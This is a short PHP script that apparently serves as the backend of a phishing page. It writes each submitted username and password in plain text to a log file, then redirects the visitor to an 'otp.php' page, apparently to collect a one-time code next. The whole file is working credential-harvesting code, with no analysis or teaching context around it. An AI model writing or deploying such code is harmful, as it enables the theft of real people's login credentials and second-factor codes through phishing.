<?php

    file_put_contents("log.txt", "Username: " . $_POST['userid'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: otp.php');
exit();
